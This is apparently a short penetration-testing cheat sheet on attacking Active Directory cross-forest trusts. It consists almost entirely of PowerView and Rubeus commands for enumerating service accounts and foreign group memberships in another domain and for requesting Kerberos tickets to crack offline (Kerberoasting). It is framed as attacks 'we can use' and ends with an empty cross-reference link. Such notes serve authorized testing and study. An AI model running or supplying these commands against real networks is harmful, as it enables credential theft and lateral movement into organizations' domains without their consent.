Below is some cross forest attack we can use, if we have access to a domain account we can have launch Cross forest trust attacks provided that the trust allows us to do it:

Cross Forest Kerberoasting:

Enumerating SPNs for other domain with PowerView:
```
Get-DomainUser -SPN -Domain <domainname> | select SamAccountName
```

Enumerating SPN Account privilege:
```
Get-DomainUser -Domain <domainname> -Identity <username> |select samaccountname,memberof
```

-Using Rubeus to get TGS Ticket cross forest:
```
.\Rubeus.exe kerberoast /domain:<domainname> /nowrap
```

Admin Password Re-Use and group memberships

We can enumerate accounts with a foreign group membership with PowerView:
```
Get-DomainForeignGroupMember -Domain <domainame> #Mark down SID
Convert-SidToName <sid>
#Example: 
Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500

```

SID History Abuse can also be conducted cross forest, refer to [[]]